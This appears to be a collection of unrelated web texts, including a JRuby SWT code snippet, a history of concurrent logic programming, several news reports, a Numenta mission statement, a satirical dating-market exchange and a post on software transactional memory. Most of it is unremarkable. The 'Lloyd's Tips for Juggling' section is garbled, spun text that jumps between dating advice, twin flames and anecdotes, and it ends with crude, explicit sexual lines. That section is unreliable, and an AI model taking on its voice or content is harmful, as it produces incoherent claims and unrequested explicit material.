Shell .
new display shell .
setSize ( 450 , 200 ) layout = RowLayout .
new layout .
wrap = true shell .
setLayout layout shell .
setText " Ruby SWT Test " label = Label .
new ( shell , SWT :: CENTER ) label .
setText " Ruby SWT Test " Button .
new ( shell , SWT :: PUSH ) . setText ( " Test Button 1 " ) shell .
pack shell .
open while (! shell .
is Disposed ) do display .
sleep unless display .
readAndDispatch end display .
dispose end
This works on OS X ( screenshot of result is at the top of this post ) but it's all generic so if you can get JRuby and the SWT JAR and support files for your platform , this same code will render a native looking window with a label and button control on whatever platform you 're running .
The major downsides so far are that it's a bit unstable ( if I move the window much , the app crashes ) and I can't seem to create events for the controls , although I think this might be due to my lack of Java nous .
Also .. it's an experimental piece of software running on an experimental compiler , so it 's far from ready for real use , and there are undoubtedly better solutions , but if you like to hack ...
A Brief History Of Stream Parallel Logic Programming
Appeared in Volume 7/2 , May 1994
Graem A Ringwood
What follows attempts to outline highlights in the history of the development without going into unilluminating detail or side issues .
1963 Conway describes coroutines in the context of multipass compilers .
1965 Streams are introduced by Landin in the context of lambda calculus .
A stream is an incrementally constructed sequence of data objects .
Streams can provide modularity without the need for state variables .
Landin proposes lazy evaluation for processing streams .
1974 Kahn proposes coroutines for processing streams .
A parallel computation is organized as a set of autonomous processes that are connected to each other in a network by communication channels ( streams ) .
The model is proposed as suitable for systems programming and the design of operating systems .
While the theory only allows determinate programs , Kahn speculates that it is possible to extend it to indeterminate programs .
1977 Kahn and McQueen extend Khan 's model to allow dynamic process creation and termination .
A functional syntax is presented which relieves the programmer of the burden of programming the synchronization .
This subordinates the control to the binding of variables ( data flow ) .
The authors suggest that channels may be broadened from linear lists to trees and tableaux .
1976 Friedman and Wise relate coroutining with a designated producer to lazy evaluation in functional programming .
1979 Van Emden and De Luceana embed the Kahn and MacQueen 's model in logic programming .
This gives a process interpretation of goals in contrast to the previous procedural interpretation .
Goals in a query or body of a clause are grouped into sequential and parallel conjunctions .
Variables shared between parallel conjunctions are regarded as communication channels .
Parallel processes suspend if shared variables are not instantiated to lists .
Input and output modes are determined by the initial goal .
The example given is determinate .
There is no discussion of nondeterminacy .
The authors have great difficulty in getting their paper accepted for publication .
It is not published until three years later as an invited contribution to a book .
Dausmann et al. use a variable delay annotation /B to synchronize processes in concurrent logic programming .
The occurrence of the annotation X/B delays reduction of the goal containing it until X is bound .
Clark and McCabe offer IC - Prolog , a version of Prolog that introduces a profusion of control facilities for synchronizing the parallel evaluation of goals .
IC - Prolog provides producer consumer variable annotations to synchronize coroutines .
This is similar to Conniver [ Sussmann and McDermott , 1972 ] .
Both producer and consumer annotations are allowed .
The same annotations can also appear in the head of a clause as well as the body .
IC - Prolog introduces Dijkstra [ 1975 ] like guards that make clause head unification and guard constraints atomic .
Unlike guarded commands , a clause with a successful guard is not exclusive .
There is variable delay annotation '!' , similar to Dausmann et al .
Input and output is handled by stream primitives .
1980 Rather than Horn clauses , Hansson et al. propose a Kahn and McQueen interpretation of a logic language based on a natural deduction system of Prawitz [ 1965 ] .
Producers and consumers are designated by an equational functional syntax .
Nondeterminacy is handled by backtracking .
Belia et al. describe FPL ( Functional plus Predicate Logic ) a Horn clause equational functional setting for a determinate language with guards ( the word constraint is used ) and directed relations .
Arguments of relations are designated as inputs and outputs .
This is similar to the modes used in Edinburgh Prolog compiler [ Warren , 1977 ] to improve the efficiency of compilation .
A program is viewed as a set of conditional rewrite rules .
A Lazy evaluation semantics allows the use of streams .
1981 With the Relational Language , Clark and Gregory [ 1981 ] make the guard introduced in IC - Prolog indeterminate ( committed choice ) as is the case with guarded commands .
Variables in the guard must be ground by the call pattern .
In the examples given , the guard constraints are primitives ( flat ) but this is not explicitly stated as a restriciton .
Producer occurrences of variables in goals are annotated .
Data flows from annotated variables to unannotated variables .
Unannotated variables are " read - only " .
Any attempt to bind a read only variable by clause head unification causes suspension of the clause .
In this year , the first FGCS International Conference on 5th Generation Computer Systems is held in Japan .
1982 Japanese launch FGCS initiative to build parallel knowledgebased machines using Prolog as a kernel language .
Initial funding for five years is granted with a promise of renewal for a further five subject to satisfactory progress .
1983 Shapiro attempts to clean up the Relational Language with Concurrent Prolog .
Shapiro relaxes the restriction that guard variables need be ground and primitive .
Allowing variables and user defined relations in the guard introduces the possibility of premature binding [ see Ringwood , 1989 for a clear expalantion of this problem ] .
This is handled by having multiple binding environments as in or - parallel Prolog .
Synchronization is controlled by variable annotations .
Rather than output variables being annotated " read - only " variables are annotated .
As a visitor to ICOT , Shapiro persuades the FGCS project to change allegiance from Prolog to Concurrent Prolog .
In response to Concurrent Prolog , Clark and Gregory propose Parlog by weakening the restrictions on the guard of the Relational language .
Rather than use multiple environments , they require guards to be safe ; a property that is undecidable .
They abandon producer annotations and use input output argument modes assigned on a per relation basis as done by Belia et al . [ 1980 ] .
1985 FGCS project produces first PSI ( Personal Sequential Inference Machine ) with SIMPOS operating system written in object oriented extension of Prolog , KL0 .
Read - only unification turns out to be order dependent [ Ueda , 1985a ; Saraswat , 1986 ] and multiple environments are difficult to implement .
Under the influence of Parlog , Ueda [ 1985b ] transforms Concurrent Prolog into GHC ( Guarded Horn Clauses ) .
GHC uses a single binding environment and dispenses with read - only variables .
The guard is used as a runtime safety check .
GHC programs have a greater tendency to deadlock .
Body goals are allowed to be spawned before commitment , which causes a large amount of speculative computation .
The principle criticism of the synchronization mechanism is that it fails to be modular : the behaviour depends on the nesting of subsequent guard calls .
Because of difficulties with implementation of multiple environments , Concurrent Prolog goes flat : ( only primitives in the guard ) .
Semantic problems prompts restricted use of read - only annotations [ Mierkowsky , Taylor , Shapiro , Levy and Safra , 1985 ] .
The principle difficulty with read - only variable as a method of synchronization is that it fails to be modular : the program behaviour depends on the form of the call .
1986 Ringwood [ 1986 ] cleanses Parlog under influence of GHC : GDC ( Guarded Definite Clauses ) replaces misleading mode declarations by pattern matching and explicit output .
Like GHC the guard is the only form of synchronization .
Unlike GHC , programs are modular but guards are unsafe .
Flat GDC is safe .
The language is viewed as a set of indeterminate conditional rewrite rules Ringwood [ 1988 ] .
1987 FGCS secures funding for further 5 years , and produces first version of multi- PSI - a number of PSI connected by a network .
Multi-PSI is used to prototype PIM ( Parallel Inference Machine ) .
Chikayama at ICOT enhances GHC ( by adding Parlog - like metacalls ) , while simplifying it ( by making it flat , FGHC ) to produce KL1 ( Kernel Language 1 ) , the kernel language of FGCS .
KL1 is modular and almost indistinguishable from FGDC .
1988 FGCS produce PIMOS operating system for PIM , written in KL1 and tested on multi-PSI [ Chikayama et al , 1988 ] .
AI Ltd produce Strand88 [ Foster and Taylor , 1988 ] a commercial implementation of a restricted version of FGDC ( previously known as Flat Parlog with Assignment ) for distributed memory machines .
1991 FGCS produce first working PIM .
Strand Software Technologies spun off from collapse of AI Ltd produce a distributed version of Strand88 .
1992 FGCS complete the 10 - year research program with an international conference .
FGCS software made public domain : IFS ( ICOT free Software ) .
Unfortunately software only runs on PSI and PIMs which are not sold commercially .
ICOT gets extension for further two years on much reduced scale to provide implementations for Unix boxes .
1993 Ericsson produce a Strand like language with a functional syntax called Erlang [ Armstrong et al , 1993 ] .
The language is targeted at realtime programming in particular telephony applications .

It ’s not every day that you see something completely new in the night sky .
But that ’s what Australian and US researchers have announced this week .
They uncovered a mysterious burst of radio energy that came from outside our galaxy .
It was incredibly bright , emanating from a tiny object , and lasted for only 5 milliseconds .
Blink and you would have missed it ( actually , do n’t bother blinking , you ’d still miss it ) .
So , the big question is : what was that ?!
Astronomers from Swinburne University and West Virginia University announced their unexpected discovery this week , with an article in the journal Science .
Their discovery was made by chance .
The researchers were analyzing radio observations of rotating pulsars – the corpses of massive stars – when they noticed a brief , bright flash of radio waves in their images .
They were looking at the Small Magellanic Cloud , a nearby dwarf galaxy , and were fortunate to have the flash occur in their field of view ; off to the side away from the galaxy .
Based on their further analysis , whatever made the flash of radio waves is millions of light - years away , well outside the galaxy , and tiny ; probably less than 1,500 km across .
Objects at this distance should be very faint , but what they found overwhelmed the radio telescope ’s detectors .
So what was it ?
There are two theories on the table right now .
One is a collision between a binary pair of neutron stars .
These exotic objects were once stars much larger than our own Sun .
After both detonated as supernovae , they spiraled inward towards one another , eventually merging .
Astronomers think this event can also cause a certain kind of gamma ray burst , but a flash of radio waves has never been seen before .
Another , even more exotic explanation is the death of black hole .
Famed astrophysicist Stephen Hawking proposed that black holes can actually evaporate , losing mass over long periods of time .
As the black hole loses mass , the evaporation speeds up , and the last few moments of a black hole could actually go quite quickly , perhaps with a flash of radio waves like this .
Based on the fact that the discovery was a total coincidence , the astronomers are hopeful that this kind of event is happening all over the sky , all the time .
Astronomers have just never thought to look for them .
It ’s possible that this discovery could even open up a whole new field of astronomy , just like when gamma ray bursts were first discovered 30 years ago when the military orbited satellites designed to see nuclear explosions on the Earth .

Cheney 's neighbors topple his effigy during protest David Edwards and Nick Juliano
Published : Monday August 13 , 2007
Print This Email This Hundreds of anti-war activists gathered near Dick Cheney 's home at an exclusive Wyoming country club to protest the vice president 's role in leading the US into Iraq .
Chanting , " No more Iraq war , " and " Impeach Cheney first , " protesters gathered outside the Teton Pines Country Club , where Cheney typically spends the month - long August recess .
They brought along a 10 - foot - tall paper - mache sculpture that featured Cheney holding a fishing poll in one hand and an oil well in the other .
In a video posted on YouTube , a protester climbs the effigy and places a noose around its neck .
Protesters then pull down the Cheney likeness in a scene reminiscent of Iraqis and US troops toppling a statue of Saddam Hussein after the fall of Baghdad .
" We organized it because of the war in Iraq and what an injustice it has been , " Walt Farmer , a retired Air Force captain and registered Republican , told the Casper Star Tribune .
" The Vice President has received a pass in Jackson long enough .
We want to let them know we do n't approve of the war or how they play fast and loose with the Constitution . "
Protesters carried signs that said " Bush - Cheney , War Profiteers , " " Feel safe yet ?
Violence breeds violence , " and " At least the war on the middle class is going well , " the Tribune reported .
One of the protesters , Cindy Knight , said she has a son in the military and came to voice displeasure with the administration 's war policy .
Knight 's son has served in Afghanistan .
" I do n't want him to lose his life in the Iraq war , " Knight told the Tribune .
The following video was posted to YouTube by Cheney protesters .

Lloyd 's Tips for Juggling : Keeping Your Options Open
When you are single -- or do n't Offer , to locating a girl that is great , the secret is to cast a broad net .
You can't do that if you hone in on a single woman at a time .
All too often , their choices cut by focusing on a girl each and every time they go out on a 26 , short .
Passionate Emotional Relationships
Possibly the most common of the many types of growing relationships that occur after a primary love relationship has finished is the kind , with its emphasis on love .
Here at last -- or so it appears -- are all of those qualities that were lost in the marriage : understanding , passion , honesty , good communication , compassion .
No wonder the new partners need it to continue forever , hang on to it closely , and talk about their future together .
Indeed , by slowly offering change instead of objection up , the leadership role is taken by girl by storm .
They do n't do it by taking advantage of the wiles or by getting manly in their approach .
They do it by taking their time , collecting conclusions and then being able to persuade .
It affects the vibration of another , if one of those Twin Flames is having a tough time raising their energetic vibration .
Consequently , if you 're new to the Twin Flame Experience , then there is triggers to push and pull from the connection due to either there is a resistance from the runner whenever they attempt to run from the relationship along with the Chaser is holding on too tightly to the connection trying to control the connection .
Never assume it on your own , until a woman particularly TELLS you something bad .
Always assume the best .
Assume she likes you .
Assume that she wishes to get to know you better .
If you allow yourself to consider why she would not want to go on the date , you will talk yourself out of it .
Though I discovered he tried to be more affectionate than usual at the restaurant my evening with Jeff went as intended .
I caught him shooting looks in the leadership of Trey if Trey responded to his glances though , because my back was turned , I could not see .
It 's safe to assume that he did .
The occasional direct question concerning my association with Trey reared its ugly head a couple of times but I could say , regardless of Jeff 's curiosity , so I was coy in my answers he did not really want to learn the answers .
On occasion the situation will be overanalyzed by the woman and get cold feet .
She may be new to online dating .
Until after you have met the first time , who knows , however , you should n't invest much time in her .
Otherwise , what if you meet her live and she 's just boring in person and no connection exists .
I had that happen about a month ago .
I thought that I was seasoned enough to pick up with this before meeting .
It moved overlooked .
Before we met we talked twice on the phone .
One of the fantastic divides in between males and females is that ladies are just extra user - friendly as well as mentally conscious .
You can not dislike The Day Dog for not speaking your love language ; no one showed him .
So we are going to bring the Hairy One along one action at a time to opening up to interaction ( and also leaving the bathroom seat down ) .
Question : I emailed a woman and she 's being rude to me .
How should I respond to her ?
How would you react to an attractive woman who was being rude to you ?
Tell her you will not have any of it and that it 's behaviour that is unacceptable .
There are different opinions regarding the use of emoticons ; I recommend to restrict their use , because I believe them to be an unnecessary and excessive investment .
Research has also shown that emoticons ( apart from the one with the smiley face of a bastard ) are perceived as very female , so in the event that you make a joke try to steer clear of smiley faces or something else , as though you were saying to the girl " Today laugh ! "
Use a voice message .
When I eventually fell in love for real ... with somebody else , at the tender age of like , twenty - seven ...
I did not expect the guy to stay .
Even though it was the kind of love that moves both ways ( I am assuming ) , since this new guy -- we 'll call him Caleb - - he loved me too .
Deepthroat is one of the most popular practices among men who have been watching porn since they were teenagers .
There is nothing like kissing the mouth of a woman who asks to be caught in the face .
It ’s hard for them to get their mouth fucked , especially if they ’re not used to it .
What We Do
We are a team of scientists and engineers applying neuroscience principles to machine intelligence research .
Our neuroscience research code is publicly disclosed and available in open source .
Our Progress
Numenta has developed a major theory of intelligence and how the brain works called The Thousand Brains Theory of Intelligence , and we ’re now exploring how to incorporate key principles of the theory to the field of machine intelligence .
What Makes Us Unique
We are one of the few teams that has developed large scale theories of the brain that are biologically constrained , testable , and implemented in software .
We believe The Thousand Brains Theory will be foundational to the creation of truly intelligent systems .
How Our Research Will Impact the Future of Machine Intelligence
Over the past decade , machine learning and AI have succeeded at performing many tasks that were unimaginable earlier .
Problems such as identifying a cat in an image or recognizing someone ’s speech are now routine in our lives .
Yet , the way these technologies accomplish the tasks is fundamentally different than how our brain accomplishes the same tasks .
For example , a machine learning system that recognizes a cat may be trained with over a million labeled training images in order to reliably identify a cat , whereas a human child learns about a cat with just a handful of examples .
Moreover , that child knows that the cat may purr , the cat may scratch and the cat can jump high , whereas all the machine knows is what a cat looks like .
The machine does n’t understand cat ; the child does .
The limitations faced by today ’s AI systems are generally agreed in the machine learning community .
Such systems require enormous time and resource to train , are brittle to noise , cannot learn continuously , and do not generalize but rather accomplish narrow , specific goals .
We are still a long way from a robot performing tasks that a child can handle easily .
We do not believe it is possible to overcome these limitations simply by proceeding down the same path with more data and more power .
A new approach is needed and we believe that approach must incorporate what we have learned from the brain .
We have a robust road map that applies the principles of neuroscience to put us on the path towards machine intelligence .
In the near term , we are applying our model to existing CNN and AI models in order to enable systems that are more brain - like , such as systems that are robust to noise and can learn continuously .
Long term , we will continue to build out more pieces of our model with the ultimate objective of creating intelligent sensorimotor systems that can learn , plan and act .
Brett pointed to The Two Things , a page that can be best summed up by quoting :
A few years ago , I was chatting with a stranger in a bar .
When I told him I was an economist , he said , “ Ah. So… what are the Two Things about economics ? ”
“ Huh ? ” I cleverly replied .
“ You know , the Two Things .
For every subject , there are really only two things you really need to know .
Everything else is the application of those two things , or just not important . ”
“ Oh , ” I said .
“ Okay , here are the Two Things about economics .
One : Incentives matter .
Two :
There ’s no such thing as a free lunch . ”
Ever since that evening , I ’ve been playing the Two Things game .
Nintendo Wii
Yeah , we said it , the new Wii rocks .
And all you PSP fanboys out there can go tell it to our mailroom .
In all seriousness , there is one major breakthrough here that 's worth noting , not that we'd be the first to do so : the Wii's new motion - sensitive remote will have you playing video games in ways you never thought possible , whether you 're swinging your arms as if you were wielding an actual sword or working on your form while playing Nintendo Bowling .
Not to jump the gun or anything , but this definitely means that in 10 years you 'll be wearing a spandex bodystocking and spinning around in a giant ball like in that virtual - reality movie Lawnmower Man .

Ampulex compressa is a wasp that has evolved to tackle roaches , insert a stinger into their brains and disable their escape reflexes .
This lets the wasp use the roach 's antennae to steer the roach to its lair , where it can lay its egg in it .
Parasite Rex author Carl Zimmer tells the story in gooey , graphic detail :
The wasp slips her stinger through the roach 's exoskeleton and directly into its brain .
She apparently use ssensors along the sides of the stinger to guide it through the brain , a bit like a surgeon snaking his way to an appendix with a laparoscope .
She continues to probe the roach 's brain until she reaches one particular spot that appears to control the escape reflex .
She injects a second venom that influences these neurons in such a way that the escape reflex disappears .
From the outside , the effect is surreal .
The wasp does not paralyze the cockroach .
In fact , the roach is able to lift up its front legs again and walk .
But now it can not move of its own accord .
The wasp takes hold of one of the roach 's antennae and leads it –in the words of Israeli scientists who study Ampulex–like a dog on a leash .
The zombie roach crawls where its master leads , which turns out to be the wasp 's burrow .
The roach creeps obediently into the burrow and sits there quietly , while the wasp plugs up the burrow with pebbles .
Now the wasp turns to the roach once more and lays an egg on its underside .
The roach does not resist .
The egg hatches , and the larva chews a hole in the side of the roach .
In it goes .
The larva grows inside the roach , devouring the organs of its host , for about eight days .
It is then ready to weave itself a cocoon –which it makes within the roach as well .
After four more weeks , the wasp grows to an adult .
It breaks out of its cocoon , and out of the roach as well .
Seeing a full - grown wasp crawl out of a roach suddenly makes those Alien movies look pretty derivative .
LOS ANGELES --
Whoever succeeds Alberto Gonzales as attorney general will face a long list of challenges at the Justice Department , from unfilled senior positions to sagging morale .
One of the most pressing , according to dozens of current and former federal prosecutors , is a budget squeeze at U.S. attorneys ' offices that has led to declines in crime prosecutions and delays in major investigations .
In the past few years , U.S. attorneys ' offices around the country have been unable to fill vacancies .

Sudan has expelled the European Commission envoy and the Canadian charge d'affaires from the country , according to western officials .
The EU Commission said its envoy , Kent Degerfelt , has been expelled while the Canadian embassy in Khartoum confirmed that Daniel Boon , its chief of mission , was also asked to leave .
Earlier on Thursday , the official SUNA news agency reported that the two were being told to leave for " interfering " in the country 's affairs .
" Sudan has summoned the envoy of the European Commission and the Canadian charge d'affaires and informed them they were considered persona non grata because they interfered in Sudanese affairs , " foreign ministry spokesman Ali al - Sadek told SUNA .
The exact reasons for their expulsion were not immediately clear .
" We have received a letter informing the head of the delegation that he should leave , " EU Commission spokeswoman Antonia Mochan said in a statement .
" We are trying to resolve the situation , " she added , without giving further details .
Frequent tensions
Khartoum has often had strained diplomatic relations with the west since many western countries have been critical of the Sudanese government 's role in the war - torn Darfur region .
This week , government forces attacked the region 's most volatile camp to flush out rebels who they say are responsible for recent attacks on police .
The chief UN envoy to Sudan , Jan Pronk , was expelled in 2006
In October 2006 , the Sudanese government expelled top UN envoy Jan Pronk for criticizing its actions in Darfur .
The war in the western Sudanese region erupted in February 2003 when rebels from minority tribes took up arms to demand an equal share of the country 's national resources , prompting a heavy - handed crackdown from government forces and proxy militia .
The African Union force in Darfur has failed to calm the violence despite a peace deal in 2006 .
According to UN estimates , at least 200,000 people have been killed and 2.5 million displaced by the combined effect of war and famine since the conflict erupted .
Human interaction and stimulation enhance chimpanzees ’ cognitive abilities , according to new research from the Chimpanzee Cognition Center at The Ohio State University .
The study is the first to demonstrate that raising chimpanzees in a human cultural environment enhances their cognitive abilities , as measured by their ability to understand how tools work .
The findings have just been published online in the Springer journal Animal Cognition .
The scientists compared three groups of chimpanzees : one with a history of long - term stable , social interaction with humans ( ‘ enculturated ’ ) ; a group raised in a sanctuary setting , with only caretaker contact with humans ( ‘ semi-enculturated ’ ) ; and another group raised under more austere captive conditions ( laboratory chimpanzees ) .
The experiments looked at how the chimpanzees used rakes in order to retrieve a fruit yoghurt reward .
The overall study examined not only whether the chimpanzees understood the properties of the tool , but also whether they understood the reasons why the tool worked .
The researchers gave the animals access to small rakes with either a rigid wooden head or a flimsy fabric head .
Both enculturated and semi-enculturated chimpanzees correctly chose the rigid rake which enabled them to obtain the reward , indicating that both of these groups understood the physical properties of the two different rakes .
The researchers then presented the same two groups with two identical ‘ hybrid ’ rakes .
Each rake head had a rigid side made of wood ( functional ) and another side made of flimsy cloth ( non-functional ) .
The reward was placed in front of the rigid side of one rake , and in front of the flimsy side of the second rake .
The animals who picked the rake with the food reward on the rigid side demonstrated that they understood the causal principles behind the functionality of the rake .
The enculturated chimpanzees successfully selected the functional rake , while the sanctuary chimpanzees chose randomly between the two hybrid tools .
The captive laboratory chimpanzees failed both tests , as demonstrated in previously published work .
According to Dr. Sarah Boysen , who led the study , “ We think our findings mean that the conditions under which chimpanzees are raised , housed , and maintained have long - term effects on their cognitive development , and offer direct comparisons with early experience , issues of attachment , and preschool education for human infants and children , ”
The authors conclude that the differences in performance between the three groups are directly attributable to the significant effect of level of enculturation .
They add that “ enculturated chimpanzees may be better at learning within a highly social , interactive context because they have heightened attention to the actions of others . ”

I must confess that I was somewhat taken aback upon reading your email .
Indeed , it has taken some time for me to sufficiently recuperate from my surprise .
Lest your confidence quickly inflate for little reason ( as we know is the predisposition for Wall St. types ) , allow me to hasten to reassure you that the source of my surprise was neither your candor nor the accuracy of your perception .
Indeed , it is your " claimed " success in light of your poor grasp of economics which has me baffled .
If the standards required to meet with financial success on Wall St. have sunk so low , perhaps I should indeed " make my own money " , except for the fact that the effort / reward ratio is far too high for my liking - especially when so many of your ilk have displayed a far more cogent grasp of market realities than you have .
By now you are likely scratching your ever - vanishing hairline in confusion , so allow me to elaborate , dear man .
To build some credibility I will tell you a bit more about yourself .
Though you did not mention the details of your occupation , it is clear that you are an investment banker and not a trader , as any good trader would understand that human courtships are based upon a semi-efficient open market , and not an investment banking cartel .
However , your inability to grasp the realities of the dating market is not surprising , given that you have successfully employed the tools of collusion and market manipulation rather that true acumen in your supposed wealth generation .
If your grasp of finance were not a minority partner with your ego , you would realize that the " outflows " associated with my depreciating " assets " are quite certain , and therefore subject to a low discount rate when determining their present value .
In addition , though your concept of economics evidentially failed to move past the 1950s , advancement in plastic surgery is not subject to the same limitation .
Thus , with some additional capital expenditure , the overall lifetime of " outflows " generated by these assets is greatly increased .
Sad that Ashton Kutcher has demonstrated understanding of the female asset class which you , in all of your financial " wisdom " , have not .
You , on the other hand , are , given the uncertainty of the Wall St. job market , more of an inflation - indexed junk bond with an underwater nested call option .
Though you may argue that you are more of an equity investment , my monetary minimums required from you do not change , and if you are unable to pay them , I will liquidate you without the benefit of a chapter 11 , just as you would me .
Because your outflows are so much more uncertain with respect to mine , I require additional compensation in the form of a underwater nested call option on your future assets .
I say underwater because , even taking into account the value of your junk bond coupon payment to me , the value of my " outflow " is in excess of the market price of your equity ( which is quite low due to its riskiness associated with your poor grasp of finance and my existing claim upon your junk bond coupon ) .
I must thank you though for raising the question , despite the reputation cost of subjecting your weak logic to such widespread scrutiny .
This took either considerable courage or ignorance on your part - and we 'll give you the benefit of doubt , just this once .
My current boyfriend ( a trader who lives in Central Park West , of course ) and I thoroughly enjoyed discussing your response and we wish you the best of luck in your unhappy pursuit of that elusive market inefficiency .
This message is in response to : I read your posting with great interest and have thought meaningfullyabout your dilemma .
I offer the following analysis of your predicament .
Firstly , I 'm not wasting your time , I qualify as a guy who fits yourbill ; that is I make more than $ 500 K per year .
That said here 's how Isee it .
Your offer , from the prospective of a guy like me , is plain and simple acrappy business deal .
Here 's why .
Cutting through all the B.S. , what yousuggest is a simple trade : you bring your looks to the party and I bringmy money .
Fine , simple .
But here 's the rub , your looks will fade and mymoney will likely continue into perpetuity ... in fact , it is very likelythat my income increases but it is an absolute certainty that you won' tbe getting any more beautiful !
So , in economic terms you are a depreciating asset and I am an earningasset .
Not only are you a depreciating asset , your depreciationaccelerates !
Let me explain , you 're 25 now and will likely stay prettyhot for the next 5 years , but less so each year .
Then the fade begins inearnest .
By 35 stick a fork in you !
So in Wall Street terms , we would call you a trading position , not a buyand hold ... hence the rub ... marriage .
It does n't make good business senseto " buy you " ( which is what you 're asking ) so I 'd rather lease .
In caseyou think I 'm being cruel , I would say the following .
If my money wereto go away , so would you , so when your beauty fades I need an out .
It 'sas simple as that .
So a deal that makes sense is dating , not marriage .
Separately , I was taught early in my career about efficient markets .
So , I wonder why a girl as " articulate , classy and spectacularly beautiful " as you has been unable to find your sugar daddy .
I find it hard tobelieve that if you are as gorgeous as you say you are that the $ 500 Khas n't found you , if not only for a tryout .
By the way , you could always find a way to make your own money and thenwe would n't need to have this difficult conversation .
With all that said , I must say you 're going about it the right way .
Classic " pump and dump .
" I hope this is helpful , and if you want to enter into some sort oflease , let me know .
Poor West African states are seen as a new hub for the drugs trade
The boat was found near the Atlantic Ocean resort of Mbour , with the drugs divided into 50 bags of 24kg each - Senegal 's biggest cocaine seizure .
Police say they found plane tickets from Brazil to Guinea - Bissau , now seen as a major drug - trafficking centre .
In Bissau , magistrates have condemned an ex-prime minister 's statement that he ordered the destruction of cocaine .
The cocaine found in Senegal was worth some $ 100 m on the streets of Western Europe .
Experts say that West Africa 's poor , coastal countries are increasingly becoming a major hub in the trafficking of cocaine from Latin America to Europe .
There have also been large cocaine seizures recently in Ghana and Sierra Leone .
' Narco - state '
Former Guinea - Bissau Prime Minister Aristides Gomes said on Thursday that he had said the drugs should be burnt - following speculation that the haul had disappeared .
Police are woefully ill - equipped and often do not even have enough gasoline to operate their vehicles
Antonio Maria Costa
UN drug agency head
" Under pressure from me and my direct order the 674 kg of cocaine were burned in my absence , " he said .
" Anyone who doubts that can take the affair to the courts . "
But the Bissau magistrates ' union says that the correct procedures for destroying the drugs were not followed .
It says it is concerned about the government 's alleged role in the drugs ' trade .
The cocaine was seized last September and was stored in a treasury vault before going missing .
Seven top officials were arrested over the affair but have not been charged .
Another 635 kg of cocaine was found in Bissau in April but the United Nations drugs agency reports that traffickers escaped with almost two tons of the drugs , which had been flown into a military airstrip .
At the time , UN Office on Drugs and Crime head Antonio Maria Costa said he feared Guinea - Bissau could become a " narco - state " unless donors did more to make the police force more effective .
" It is regrettable that the rest of the consignment was not intercepted but hardly surprising as the police are woefully ill - equipped and often do not even have enough gasoline to operate their vehicles , " he said .
Cancer patients ' state of mind has no influence on their survival chances , according to a US study that contradicts a widespread belief in the power of positive thinking .
Researchers led by James Coyne , professor of psychology at the University of Pennsylvania , found no correlation to a cancer victim 's mental wellbeing and their ultimate chances of beating off the disease .
" The belief that a patient 's psychological state can impact the course and outcome of their cancer is one that has been prominent among patients and medical professionals alike , " Professor Coyne wrote in the study .
" While there can be lots of emotional and social benefits of psychotherapy , patients should not seek such experiences solely on the expectation that they are extending their lives , " he said .
The study analysed 1,093 sufferers of cancer in the head or neck , of whom 646 died before the research period ended .
The researchers found no link to suggest that those who lived owed their survival to a positive frame of mind , whatever their gender , type of cancer or the stage of their disease .
" While this study may not end the debate , it does provide the strongest evidence to date that psychological factors are not independently prognostic in cancer management , " Professor Coyne said .

Asked at a news conference this morning whether he thought the turmoil in the subprime lending market could put a chill on credit in the broader economy , President Bush said he did not think that the federal government needs to step in to provide more money to the financial markets .
“ The fundamentals of our economy are strong , ” he said .
“ Another factor one has got to look at is the amount of liquidity in the system , ” he added .
“ In other words , is there enough liquidity to enable markets to be able to correct ?
And I am told there is enough liquidity in the system to enable markets to correct . ”

The pottery is the best ever found in the area , experts say
A fisherman caught the octopus off South Korea 's west coast in May .
He said the animal appeared to be hiding under a plate .
Archaeologists searched the area and discovered a 12th Century wooden wreck buried in mudflats .
They said more than 500 pieces of porcelain had been recovered so far .
" These are the highest quality artefacts ever discovered in our seas , " said Yun Yong - i , a Korean art history professor from Myongji University .
Moon Whan -suk , from the National Maritime Museum , expressed surprise that the tiny octopus - about the size of an orange - had managed to hold on to the plate .
He told Reuters news agency : " I can't believe how such a small octopus managed to cover its shell with such a large plate .
" I guess it meant for us to discover the artefacts . "
The porcelain , found near Taean , south - west of the capital Seoul , is thought to date from the Goryeo dynasty , which ruled Korea from the 10th to the 14th Century .
Experts say the 7.7 m - long ( 25 ft ) wreck could contain up to 2,000 further pieces , including ancient bowls , plates and other types of pottery .
Several shipwrecks laden with relics have already been found along the west coast of South Korea .
Haskell has been garnering a fair bit of attention of late , largely as a result of Simon Peyton - Jones ‘ presence at OSCON ( and the ensuing flurry of Reddit postings of related blog posts ) .
He gave a keynote on Software Transactional Memory ( STM ) , which is an alternative to using explicit locks and condition variables in writing parallel programs .
He also gave an introduction to Haskell , and a smaller talk on data parallelism .
I ’m quite pleased by this recent attention , for a couple reasons .
The first is that I really agree with Simon that STM is going to be the way to go soon * .
I also just think it ’s damn cool – that ’s why I did an independent study on it with Maurice Herlihy last semester , working with a slightly more recent version of Microsoft ’s SXM implementation of STM for C# than that available at the link I just gave .
Simon gives excellent motivation for STM in his talk , but there are still others if you ’re unconvinced after watching it .
Consider a datastructure which you traverse in multiple directions – perhaps a grid , which can be traversed in either direction in either dimension depending on the contents at a given location – or perhaps a mutable graph representation .
What locking scheme do you use for scalable ( read : not coarse - grained ) access to a large instance of this datastructure ?
You could establish a total ordering of nodes and corresponding locks , or do a row / column at a time with an ordering on rows / columns in a table , and acquire locks only in that order .
But since you can traverse in any direction , this would sometimes require building lists of locks to acquire , releasing later locks which were acquired in reaching the current point of traversal , and then walking the list reacquiring locks .
How expensive is this , possibly acquiring the same lock over and over ?
How hard is it to write that code correctly ?
How much effort does it take to document , and for a new maintainer to learn , this locking scheme ?
All of this makes fine - grained locking a poor idea at best .
How much easier would it be to write such code naïvely and mark it as atomic ?
And with a proper implementation of STM , how much faster could this be on a large structure than a coarse - grained lock , or repeated acquisition and release of the same fine - grained locks ?
And this is a bonus on top easier coding for simple concurrent structures ( and partial failures ) , and composition of atomic transactions , which can not be done with normal locks .
If , like me , you ’re curious about how STM is implemented , I suggest you check out a few papers .
Understanding of all of these benefits from understanding the basic ideas and terminology of concurrency , as well as a bit of computer architecture knowledge .
Transactional Memory : Architectural Support for Lock - Free Data Structures ( actual pdf ) .
This is actually hardware transactional memory ( HTM ) , but is the paper which started the thinking about transactional memory in general .
Lowering the Overhead of Nonblocking Software Transactional Memory .
This gives an overview of the implementation and performance of a library - based approach to STM .
Transactional Locking II .
Another implementation of STM , with some very different design decisions from those made in the previous paper .
Advanced Contention Management for Dynamic Software Transactional Memory .
When two STM transactions conflict with each other , the system will allow one transaction to commit , and the other will fail and retry .
Deciding which transaction (s ) to commit can greatly affect performance of an STM system , and as a result much work has been done on choosing an algorithm for contention management .
This does a good survey of some of the main approaches and their performance .
